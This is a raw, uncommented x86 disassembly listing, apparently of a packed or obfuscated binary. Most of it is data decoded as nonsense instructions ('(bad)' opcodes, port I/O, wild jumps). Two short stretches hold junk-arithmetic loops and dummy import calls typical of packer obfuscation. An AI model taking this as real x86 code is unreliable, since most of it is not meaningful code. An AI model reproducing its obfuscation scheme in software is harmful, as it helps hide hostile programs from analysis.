  403118:	pop    ds
  403119:	jmp    0xc13d05b
  40311e:	inc    edx
  40311f:	cmp    ch,BYTE PTR ss:[edx-0x3a]
  403123:	das    
  403124:	add    eax,0x556c8e76
  403129:	das    
  40312a:	daa    
  40312b:	xchg   ecx,eax
  40312c:	and    al,0xe9
  40312e:	out    0x6c,eax
  403130:	pop    ss
  403131:	scas   eax,DWORD PTR es:[edi]
  403132:	mov    al,0xaf
  403134:	mov    ds:0x89f967cf,eax
  403139:	call   0x3b082969
  40313e:	xchg   DWORD PTR [eax],esp
  403140:	inc    eax
  403141:	nop
  403142:	mov    dl,0xaf
  403144:	ins    DWORD PTR es:[edi],dx
  403145:	mov    eax,0x4c76630f
  40314a:	mov    ?,ebx
  40314c:	and    edx,edi
  40314e:	stc    
  40314f:	dec    ecx
  403150:	cmp    eax,0x40d9380b
  403155:	jne    0x40312f
  403157:	jmp    0x4031c1
  403159:	into   
  40315a:	fistp  QWORD PTR [esi-0x28]
  40315d:	bound  eax,QWORD PTR [edi]
  40315f:	sar    DWORD PTR [edi+0x3bf7a7f8],1
  403165:	ds fcmove st,st(0)
  403168:	push   ds
  403169:	jg     0x403137
  40316b:	mov    al,ds:0xad980505
  403170:	ds xchg ch,cl
  403173:	inc    edx
  403174:	jnp    0x4031d3
  403176:	loopne 0x4031b1
  403178:	add    al,0x97
  40317a:	in     eax,0x4f
  40317c:	rcl    DWORD PTR [ebx+ebx*1-0x5d718c43],0xe0
  403184:	jno    0x4031ed
  403186:	and    bh,BYTE PTR [esi+0x5c]
  403189:	push   esi
  40318a:	test   al,0x61
  40318c:	push   0x6
  40318e:	fimul  WORD PTR [eax+0x3f15c96c]
  403194:	js     0x403175
  403196:	lahf   
  403197:	jno    0x4031b9
  403199:	mov    edi,0x2b47900c
  40319e:	mov    DWORD PTR [eax-0x68cde1e0],ecx
  4031a4:	inc    ecx
  4031a5:	addr16 mov ch,0x87
  4031a8:	jge    0x403144
  4031aa:	add    BYTE PTR [eax],bh
  4031ac:	mov    cl,0x13
  4031ae:	adc    esp,edi
  4031b0:	jmp    0x4031a6
  4031b2:	inc    ebx
  4031b3:	mov    esp,DWORD PTR [ecx]
  4031b5:	xor    eax,0xa1ca3a82
  4031ba:	int3   
  4031bb:	les    eax,FWORD PTR [eax+0x2e]
  4031be:	inc    esi
  4031bf:	jne    0x4031b1
  4031c1:	adc    al,0xc3
  4031c3:	add    ebp,DWORD PTR [eax-0x1873071d]
  4031c9:	(bad)  
  4031ca:	cdq    
  4031cb:	jne    0x40319f
  4031cd:	mov    al,ds:0x6d0b4b38
  4031d2:	mov    eax,ds:0x751d2f9c
  4031d7:	out    0xa6,al
  4031d9:	iret   
  4031da:	ficom  WORD PTR [esi*4+0x486e85a2]
  4031e1:	jns    0x4031e3
  4031e3:	outs   dx,DWORD PTR ds:[esi]
  4031e4:	push   cs
  4031e5:	inc    esi
  4031e6:	adc    eax,0x88f56c8f
  4031eb:	adc    eax,0x2641c372
  4031f0:	mov    edx,0x890b8759
  4031f5:	xchg   esi,eax
  4031f6:	xor    al,0x9d
  4031f8:	loope  0x40320d
  4031fa:	mov    ecx,0xb948c7c3
  4031ff:	cmc    
  403200:	mov    edi,0x66370050
  403205:	outs   dx,DWORD PTR ds:[esi]
  403206:	adc    BYTE PTR [edx+0x6d37b296],0x27
  40320d:	xchg   ch,bl
  40320f:	lahf   
  403210:	xor    edx,DWORD PTR [esi-0x39]
  403213:	jge    0x403278
  403215:	mov    ds:0xfd29f209,al
  40321a:	not    BYTE PTR [ecx-0x3526ee9d]
  403220:	or     al,0x84
  403222:	mov    bh,0x84
  403224:	or     BYTE PTR [ecx+0x8d9d4ca],0x55
  40322b:	adc    eax,0x8f3b7c1e
  403230:	icebp  
  403231:	mov    ch,0x83
  403233:	sbb    dh,cl
  403235:	fucompp 
  403237:	push   0xffffff84
  403239:	aas    
  40323a:	adc    ebx,ebp
  40323c:	aam    0x43
  40323e:	inc    esp
  40323f:	sub    ebp,ebp
  403241:	push   ecx
  403242:	mov    ch,BYTE PTR ds:0xc38ee2f3
  403248:	xor    DWORD PTR [esi+0x4d19aab1],0x25
  40324f:	les    ecx,FWORD PTR [ebx-0x281cfbc1]
  403255:	push   ds
  403256:	out    dx,eax
  403257:	arpl   WORD PTR [ebx],cx
  403259:	xchg   ebp,eax
  40325a:	and    BYTE PTR [edx],ch
  40325c:	out    0xa9,al
  40325e:	outs   dx,BYTE PTR ds:[esi]
  40325f:	xor    ch,BYTE PTR [ebx+0x50aa8db5]
  403265:	mov    esp,ecx
  403267:	loopne 0x4032a1
  403269:	mov    dl,0x4c
  40326b:	jge    0x403280
  40326d:	sbb    DWORD PTR ds:0x46f6a5e,0x58
  403274:	inc    esi
  403275:	xor    edi,DWORD PTR [eax+0x8a38]
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x4346fb,0x4346c3
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43470f
  403297:	xor    ecx,DWORD PTR ds:0x43466b
  40329d:	mov    DWORD PTR ds:0x43470f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x4346ff
  4032ac:	xor    DWORD PTR ds:0x434683,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43470f
  4032bb:	sbb    ecx,DWORD PTR ds:0x43473f
  4032c1:	mov    DWORD PTR ds:0x43470f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43470f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43478b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     bh,BYTE PTR [edx*1+0x100b1be4]
  4032f8:	jle    0x403378
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x40337a
  4032ff:	mov    eax,0xbd707cbd
  403304:	push   esi
  403305:	pop    es
  403306:	jbe    0x403292
  403308:	jae    0x40332a
  40330a:	mov    ah,0xff
  40330c:	adc    ah,BYTE PTR [eax+0x55]
  40330f:	js     0x403371
  403311:	mov    ah,0x78
  403313:	xor    cl,BYTE PTR [ebp+0x52]
  403316:	mov    ecx,0xc8515813
  40331b:	inc    eax
  40331c:	push   0xc565c3cd
  403321:	adc    al,0x0
  403323:	call   DWORD PTR [ebx+0x71]
  403326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403327:	mov    eax,0x88d891c5
  40332c:	outs   dx,BYTE PTR ds:[esi]
  40332d:	and    BYTE PTR [esp+ecx*4+0x1b],0x1f
  403332:	hlt    
  403333:	pop    es
  403334:	pop    eax
  403335:	aas    
  403336:	pop    es
  403337:	and    ebx,DWORD PTR [ecx-0x2]
  40333a:	out    0x1e,al
  40333c:	into   
  40333d:	stc    
  40333e:	xchg   esp,eax
  40333f:	xor    ebp,DWORD PTR [edx-0x5c]
  403342:	pop    ebx
  403343:	mov    dh,BYTE PTR [eax]
  403345:	mov    edx,0xea2136bc
  40334a:	out    0xd5,eax
  40334c:	ja     0x4033c4
  40334e:	jle    0x403364
  403350:	push   esp
  403351:	neg    BYTE PTR [edi]
  403353:	aaa    
  403354:	jne    0x403355
  403356:	mov    bl,0x28
  403358:	jno    0x4033d0
  40335a:	push   0x831d878d
  40335f:	inc    esp
  403360:	cmp    DWORD PTR [esp+ecx*2],edx
  403363:	xchg   ecx,eax
  403364:	pop    edx
  403365:	pop    ebx
  403366:	or     ecx,DWORD PTR [ebp-0x4f]
  403369:	push   esp
  40336a:	xlat   BYTE PTR ds:[ebx]
  40336b:	js     0x40333d
  40336d:	mov    ecx,0x3e1304e0
  403372:	outs   dx,DWORD PTR ds:[esi]
  403373:	int    0xca
  403375:	cwde   
  403376:	lea    esi,ds:0xeca70c22
  40337c:	in     eax,0xb4
  40337e:	les    esi,FWORD PTR [esi]
  403380:	push   esp
  403381:	gs ss in eax,dx
  403384:	mov    esi,0x6ebd1d55
  403389:	xor    dh,BYTE PTR [edi+0x4e]
  40338c:	pop    ecx
  40338d:	popf   
  40338e:	adc    eax,0xb82bd1f5
  403393:	das    
  403394:	lds    esp,FWORD PTR [eax+edi*4]
  403397:	push   ss
  403398:	sbb    al,0xd2
  40339a:	add    DWORD PTR [esi-0x63f61a49],esp
  4033a0:	test   DWORD PTR [ebp+0xc4fba53],eax
  4033a6:	out    dx,al
  4033a7:	stos   BYTE PTR es:[edi],al
  4033a8:	test   BYTE PTR [edi+0x51785ef2],dl
  4033ae:	jge    0x403392
  4033b0:	js     0x40337d
  4033b2:	mov    eax,DWORD PTR [ecx]
  4033b4:	pop    ebp
  4033b5:	sub    eax,0x724c71ba
  4033ba:	lea    ecx,[esi]
  4033bc:	sub    edx,DWORD PTR gs:[ebp-0x22]
  4033c0:	or     edx,DWORD PTR [ecx-0x106c7e8]
  4033c6:	mov    bh,0x47
  4033c8:	xchg   ecx,eax
  4033c9:	dec    esi
  4033ca:	sub    esi,DWORD PTR [esi+edx*4]
  4033cd:	xor    BYTE PTR [ebx-0x4482f542],bl
  4033d3:	out    0x71,eax
  4033d5:	ss mov eax,0x8410180d
  4033db:	dec    edx
  4033dc:	or     bl,BYTE PTR [edi]
  4033de:	nop
  4033df:	xchg   ebx,eax
  4033e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033e1:	pop    ecx
  4033e2:	cmp    al,dl
  4033e4:	jmp    0x44253896
  4033e9:	xchg   edx,eax
  4033ea:	mov    esi,cs
  4033ec:	nop
  4033ed:	int    0x8
  4033ef:	adc    bl,BYTE PTR [eax+esi*2+0x14]
  4033f3:	sub    esi,DWORD PTR [edx+0x60b9ea14]
  4033f9:	xchg   esp,eax
  4033fa:	ret    
  4033fb:	jno    0x4033cf
  4033fd:	jp     0x403466
  4033ff:	xor    esp,DWORD PTR [ebx+ecx*4]
  403402:	in     eax,dx
  403403:	add    al,0x90
  403405:	pop    edi
  403406:	test   eax,0x23707fd4
  40340b:	rol    DWORD PTR [ebx-0x54],cl
  40340e:	lahf   
  40340f:	xor    esp,ebx
  403411:	jne    0x403416
  403413:	xlat   BYTE PTR ds:[ebx]
  403414:	(bad)  
  403415:	loop   0x4033cb
  403417:	call   0x6b70a2ea
  40341c:	leave  
  40341d:	fsubr  QWORD PTR [esi+0x173d2c11]
  403423:	xor    DWORD PTR [ecx],esi
  403425:	rol    DWORD PTR [ebx-0x3048f0b4],1
  40342b:	out    0x46,eax
  40342d:	ror    BYTE PTR [edi-0x73415d87],cl
  403433:	or     BYTE PTR [eax],bl
  403435:	and    al,0x2f
  403437:	pop    ds
  403438:	dec    esp
  403439:	ins    DWORD PTR es:[edi],dx
  40343a:	add    DWORD PTR [edx-0x19],esi
  40343d:	xor    DWORD PTR [bx+di],ecx
  403440:	xor    ah,BYTE PTR ds:0x689c810a
  403446:	jns    0x403450
  403448:	in     eax,dx
  403449:	lock aaa 
  40344b:	scas   eax,DWORD PTR es:[edi]
  40344c:	cmc    
  40344d:	lds    ebx,FWORD PTR [ebx+ecx*8-0x2b]
  403451:	cmc    
  403452:	sti    
  403453:	int3   
  403454:	sub    dh,BYTE PTR [esi+ecx*2-0x1c30e608]
  40345b:	adc    eax,DWORD PTR [esi]
  40345d:	loop   0x403459
  40345f:	mov    WORD PTR [edx],gs
  403461:	shl    DWORD PTR [ebx-0x72],cl
  403464:	loop   0x4034b3
  403466:	sbb    esp,esi
  403468:	pushf  
  403469:	sub    eax,0xe763d245
  40346e:	mov    al,0xd2
  403470:	push   ss
  403471:	out    0xd,eax
  403473:	push   ebp
  403474:	cmp    al,0x90
  403476:	inc    esp
  403477:	test   eax,0x31fe7148
  40347c:	mov    DWORD PTR [ebx],edi
  40347e:	inc    ebx
  40347f:	jmp    0x1f52225a
  403484:	jle    0x4034fd
  403486:	jno    0x403454
  403488:	mov    edx,0xfb7d1f80
  40348d:	scas   eax,DWORD PTR es:[edi]
  40348e:	test   BYTE PTR [edx+0x7c],ah
  403491:	pushf  
  403492:	cmp    eax,0xffffffee
  403495:	push   ds
  403496:	jb     0x4034d5
  403498:	test   DWORD PTR [edi],0x4c49be6
  40349e:	loopne 0x40344a
  4034a0:	call   0x7daf:0xb8981119
  4034a7:	adc    al,0xd4
  4034a9:	int3   
  4034aa:	test   DWORD PTR [eax-0x2d76c25d],edi
  4034b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b1:	(bad)  
  4034b2:	cli    
  4034b3:	push   ds
  4034b4:	lahf   
  4034b5:	test   ebp,0x1b21893e
  4034bb:	mov    dl,0x1e
  4034bd:	xchg   BYTE PTR [edx-0x23],cl
  4034c0:	mov    bh,0x44
  4034c2:	cli    
  4034c3:	mov    ?,WORD PTR [esi]
  4034c5:	(bad)  [edi]
  4034c7:	sbb    al,0xc5
  4034c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ca:	pushf  
  4034cb:	adc    al,0x23
  4034cd:	mov    DWORD PTR [ebx+0x18],eax
  4034d0:	jae    0x40352e
  4034d2:	fcom   st(0)
  4034d4:	jecxz  0x403541
  4034d6:	xchg   esi,eax
  4034d7:	jmp    0x4034eb
  4034d9:	mov    dl,BYTE PTR [eax-0x2d727aab]
  4034df:	fdivrp st(0),st
  4034e1:	jmp    0x4034b6
  4034e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e4:	pop    edx
  4034e5:	imul   ebp,ebp,0xbc33afe6
  4034eb:	or     ebx,ecx
  4034ed:	cmc    
  4034ee:	std    
  4034ef:	or     BYTE PTR [edi+0xcfd1150],cl
  4034f5:	pushf  
  4034f6:	hlt    
  4034f7:	aam    0xc9
  4034f9:	mov    DWORD PTR [eax-0x53],ebp
  4034fc:	hlt    
  4034fd:	mov    BYTE PTR [edi+0x4c],dh
  403500:	fs sub eax,0xf719c24d
  403506:	mov    DWORD PTR [edx],ebx
  403508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403509:	mov    bl,0x2c
  40350b:	jle    0x40356e
  40350d:	inc    eax
  40350e:	ja     0x403575
  403510:	out    dx,eax
  403511:	and    eax,0x20ed51d2
  403516:	mov    BYTE PTR [ebx+0x17],dl
  403519:	(bad)  [ebp+0x6b7e6a8d]
  40351f:	inc    edx
  403520:	xor    BYTE PTR [ebx-0x24a68ed7],al
  403526:	aaa    
  403527:	mov    ah,0xc0
  403529:	jg     0x403511
  40352b:	ret    0xda65
  40352e:	retf   
  40352f:	or     DWORD PTR [eax],ebp
  403531:	inc    esi
  403532:	pop    ebp
  403533:	in     eax,0x3c
  403535:	and    eax,0x7830ff93
  40353a:	sbb    BYTE PTR [edi-0x7],dh
  40353d:	in     al,dx
  40353e:	pop    ds
  40353f:	loop   0x4034c9
  403541:	pop    esp
  403542:	jo     0x4035b3
  403544:	js     0x403571
  403546:	(bad)  [ebx]
  403548:	(bad)  
  403549:	pop    ebp
  40354a:	nop
  40354b:	dec    edx
  40354c:	mov    cl,0x40
  40354e:	adc    edx,edi
  403550:	aam    0x8d
  403552:	adc    ebx,esp
  403554:	loopne 0x4034e9
  403556:	in     eax,0xfd
  403558:	lods   eax,DWORD PTR ds:[esi]
  403559:	jl     0x4035b2
  40355b:	mov    ebx,0xddf0375
  403560:	pushf  
  403561:	sahf   
  403562:	sub    eax,0xc3a7f3a4
  403567:	in     al,0x15
  403569:	dec    edx
  40356a:	sbb    DWORD PTR [edx+0x44],esp
  40356d:	out    0x49,eax
  40356f:	mov    dl,0x4f
  403571:	imul   eax,edx,0x9aa8c32b
  403577:	mov    ds,WORD PTR [ecx+ecx*1]
  40357a:	push   cs
  40357b:	ins    BYTE PTR es:[edi],dx
  40357c:	adc    esp,DWORD PTR [ecx+0x54]
  40357f:	pop    ebp
  403580:	cmp    esp,DWORD PTR [ebp+0x29]
  403583:	inc    ecx
  403584:	xchg   ebx,eax
  403585:	repnz push 0xaa0e8cab
  40358b:	mov    bl,0x61
  40358d:	inc    esi
  40358e:	test   DWORD PTR [edi-0x16],0x4c33048
  403595:	arpl   WORD PTR [eax-0x3e8bff77],di
  40359b:	rol    DWORD PTR [esi+0x380a7f9c],0x6d
  4035a2:	and    dl,al
  4035a4:	pop    ds
  4035a5:	out    0xfe,eax
  4035a7:	inc    esp
  4035a8:	fs and eax,0x1cfd1416
  4035ae:	inc    ebp
  4035af:	jp     0x403617
  4035b1:	xchg   edx,eax
  4035b2:	adc    eax,edi
  4035b4:	sbb    esp,DWORD PTR [edi-0x2e2e4249]
  4035ba:	mov    ah,BYTE PTR [edi+0x68]
  4035bd:	xor    BYTE PTR [ecx+ebx*4-0x1b],bh
  4035c1:	cld    
  4035c2:	mov    al,ds:0x66fc711c
  4035c7:	repz push ds
  4035c9:	mov    ecx,?
  4035cb:	inc    esi
  4035cc:	jo     0x4035ed
  4035ce:	cld    
  4035cf:	mov    ebp,esi
  4035d1:	inc    esp
  4035d2:	nop
  4035d3:	push   ds
  4035d4:	shr    BYTE PTR [eax-0x6c14b9af],0x8
  4035db:	or     al,0x6b
  4035dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035de:	enter  0xccff,0xd5
  4035e2:	fwait
  4035e3:	in     al,0x5e
  4035e5:	psubd  mm0,mm1
  4035e8:	or     ch,BYTE PTR [esi-0x46ec6751]
  4035ee:	push   0xffffff80
  4035f0:	test   eax,0xbada3cdd
  4035f5:	(bad)  
  4035f6:	dec    edx
  4035f7:	pop    edi
  4035f8:	int3   
  4035f9:	push   edx
  4035fa:	gs push 0x7e42938b
  403600:	test   al,0xc6
  403602:	push   edi
  403603:	(bad)  
  403604:	into   
  403605:	lods   al,BYTE PTR ds:[esi]
  403606:	or     DWORD PTR [ebx+0x20],ecx
  403609:	call   0xa81b26d8
  40360e:	loope  0x403653
  403610:	int3   
  403611:	sbb    DWORD PTR [ebx+0x2e],edx
  403614:	dec    edi
  403615:	out    0xbd,al
  403617:	jnp    0x403650
  403619:	pop    esp
  40361a:	and    bl,BYTE PTR [ebx]
  40361c:	nop
  40361d:	test   bl,dh
  40361f:	pop    es
  403620:	loop   0x4035ed
  403622:	rol    DWORD PTR [eax-0x7d],1
  403625:	popf   
  403626:	mov    bl,0x99
  403628:	ins    BYTE PTR es:[edi],dx
  403629:	gs je  0x403609
  40362c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40362d:	in     eax,0x44
  40362f:	call   0x243e7a98
  403634:	(bad)  [ebx-0x2987c789]
  40363a:	call   ebp
  40363c:	dec    ecx
  40363d:	fs jae 0x4035fe
  403640:	pop    ebp
  403641:	mov    ebx,0x28f30e0f
  403646:	cdq    
  403647:	fwait
  403648:	push   eax
  403649:	sub    BYTE PTR [edx-0x9161314],ah
  40364f:	push   0xffffffc9
  403651:	test   ah,bl
  403653:	mov    esp,0x3afd873b
  403658:	mov    bh,BYTE PTR [esi+esi*1+0x5b7182b5]
  40365f:	or     eax,esi
  403661:	(bad)  
  403663:	sahf   
  403664:	icebp  
  403665:	cwde   
  403666:	mov    al,ds:0xe67a57e8
  40366b:	and    eax,0x9a87848d
  403670:	retf   
  403671:	mov    ebp,0x2cd3e24e
  403676:	fs aas 
  403678:	ret    0x6a09
  40367b:	outs   dx,BYTE PTR ds:[esi]
  40367c:	xchg   esi,eax
  40367d:	aas    
  40367e:	leave  
  40367f:	cli    
  403680:	jns    0x4036c6
  403682:	or     bl,dl
  403684:	call   0x2b30:0x58adef4d
  40368b:	outs   dx,DWORD PTR ds:[esi]
  40368c:	bound  esp,QWORD PTR [esi]
  40368e:	mov    fs,eax
  403690:	repnz shl BYTE PTR [edx],1
  403693:	ficom  DWORD PTR [ebx+ebx*8]
  403696:	dec    eax
  403697:	test   dh,bh
  403699:	jbe    0x403706
  40369b:	ins    DWORD PTR es:[edi],dx
  40369c:	pop    ebx
  40369d:	xchg   edx,edx
  40369f:	mov    cl,0x93
  4036a1:	inc    esp
  4036a2:	pop    ecx
  4036a3:	push   dx
  4036a5:	and    al,0x75
  4036a7:	popf   
  4036a8:	ja     0x403713
  4036aa:	(bad)  
  4036ab:	fadd   QWORD PTR [edx-0x67bd3bae]
  4036b1:	in     eax,dx
  4036b2:	mov    edi,0x62893887
  4036b7:	outs   dx,DWORD PTR ds:[esi]
  4036b8:	push   esp
  4036b9:	xchg   ebx,eax
  4036ba:	pop    ecx
  4036bb:	push   esi
  4036bc:	jecxz  0x4036a9
  4036be:	xor    eax,0x3192e4f0
  4036c3:	push   ss
  4036c4:	gs cld 
  4036c6:	xor    eax,DWORD PTR [esi+edx*2-0x5c]
  4036ca:	nop
  4036cb:	pop    ebx
  4036cc:	mov    edx,0x589b849c
  4036d1:	test   al,dl
  4036d3:	das    
  4036d4:	inc    edi
  4036d5:	repz mov al,BYTE PTR [ebp-0x1]
  4036d9:	mov    ecx,DWORD PTR ds:0x43466b
  4036df:	sbb    ecx,DWORD PTR ds:0x434787
  4036e5:	mov    DWORD PTR ds:0x43466b,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434793,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x43467b,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x434677,0x434787
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x4346f7,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434707,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434707
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434707,ecx
  40373d:	cmp    DWORD PTR ds:0x434707,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434707,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x43474b,0x14
  403779:	cmp    DWORD PTR ds:0x43474b,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x43474b,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x43474b,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x43474b
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x43474b,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x43474b
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x43474b,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x434667,0x1c
  4037dc:	cmp    DWORD PTR ds:0x434667,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x434667,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x4348c9
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x434667,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x434667
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x434667,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x434667
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x434667,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434707,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43478b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x4346cf,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x4346c3
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x4346cb,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	in     al,0x10
  4038bf:	ror    BYTE PTR [ecx+0x63],0x13
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x403877
  4038ca:	repz pop ebp
  4038cc:	sub    DWORD PTR [esi-0x52],0x1a05d858
  4038d3:	add    al,0xca
  4038d5:	push   edi
  4038d6:	inc    esi
  4038d7:	inc    ecx
  4038d8:	xchg   edx,eax
  4038d9:	push   es
  4038da:	and    DWORD PTR [esi],ebp
  4038dc:	xor    bh,BYTE PTR [ecx-0xb]
  4038df:	or     eax,0x21a6e4be
  4038e4:	aam    0x39
  4038e6:	adc    esi,DWORD PTR [ebx+0x690bc87e]
  4038ec:	js     0x403925
  4038ee:	sub    al,0xed
  4038f0:	mov    al,0x58
  4038f2:	cvttps2pi mm1,QWORD PTR [edi-0x64d5761]
  4038f9:	jne    0x403897
  4038fb:	dec    ebx
  4038fc:	cmp    al,0xbd
  4038fe:	test   al,0x8a
  403900:	mov    ebp,0xab1c6817
  403905:	mov    ah,0x3a
  403907:	ret    
  403908:	mov    esp,0x82bae0b6
  40390d:	ins    BYTE PTR es:[edi],dx
  40390e:	test   DWORD PTR [eax+0x48a3bae6],edx
  403914:	push   ebp
  403915:	or     eax,0xfdba1b9
  40391a:	cmp    eax,0x1122d6ca
  40391f:	loopne 0x4038b4
  403921:	sar    BYTE PTR [ecx],cl
  403923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403924:	test   DWORD PTR [eax],edx
  403926:	dec    esi
  403927:	out    0xf6,al
  403929:	mov    esi,0x20d4debf
  40392e:	add    cl,BYTE PTR ds:0xb97056ce
  403934:	mov    WORD PTR [ecx-0x35],fs
  403937:	xor    dh,cl
  403939:	std    
  40393a:	cmp    DWORD PTR [ebx+0x134f1532],ecx
  403940:	sub    al,0xdc
  403942:	adc    DWORD PTR [esi+0x3a],edx
  403945:	(bad)  
  403946:	stc    
  403947:	xchg   edi,eax
  403948:	ret    
  403949:	cmp    DWORD PTR [edi+0x2c],ecx
  40394c:	mov    ecx,0xbd5cc2e
  403951:	jnp    0x403950
  403953:	push   ss
  403954:	ss loopne 0x4038ec
  403957:	mov    WORD PTR [edi-0xe504bf3],es
  40395d:	out    0xf0,al
  40395f:	aas    
  403960:	jae    0x403984
  403962:	adc    DWORD PTR [edx-0x5d03d179],esi
  403968:	fdivr  QWORD PTR [edi+0x56d9280f]
  40396e:	push   0x57
  403970:	push   ds
  403971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403972:	jp     0x403904
  403974:	popf   
  403975:	pop    ebx
  403976:	mov    ecx,ds
  403978:	push   0xa3d9c14
  40397d:	dec    esi
  40397e:	cmp    al,0xd8
  403980:	leave  
  403981:	xchg   edx,eax
  403982:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403984:	pop    ds
  403985:	and    BYTE PTR [ecx+eiz*8-0x12],bl
  403989:	test   al,0xd6
  40398b:	jp     0x4039aa
  40398d:	push   0x51
  40398f:	(bad)  
  403990:	frstor [ebx]
  403992:	push   esp
  403993:	xchg   ebx,eax
  403994:	pop    ebx
  403995:	cmc    
  403996:	daa    
  403997:	inc    ebx
  403998:	imul   eax,DWORD PTR [edx],0xb090f1e1
  40399e:	and    eax,0x572a362
  4039a3:	test   al,0x6a
  4039a5:	test   eax,0x80e2a7ac
  4039aa:	xor    bl,BYTE PTR [ecx-0x54]
  4039ad:	(bad)  
  4039ae:	pop    ss
  4039af:	popa   
  4039b0:	add    al,0xb9
  4039b2:	pop    es
  4039b3:	dec    esp
  4039b4:	daa    
  4039b5:	or     esp,DWORD PTR [edx]
  4039b7:	xor    esi,DWORD PTR [edi]
  4039b9:	ja     0x403a00
  4039bb:	mov    ds:0xe19075dc,eax
  4039c0:	mov    esi,0xe88dd5c0
  4039c5:	dec    ecx
  4039c6:	in     eax,dx
  4039c7:	dec    ecx
  4039c8:	fcmovne st,st(2)
  4039ca:	clc    
  4039cb:	test   ebx,ecx
  4039cd:	(bad)  
  4039ce:	std    
  4039cf:	push   ss
  4039d0:	ja     0x4039d3
  4039d2:	dec    eax
  4039d3:	and    al,BYTE PTR [eax]
  4039d5:	cmp    ecx,DWORD PTR [eax]
  4039d7:	jo     0x403a52
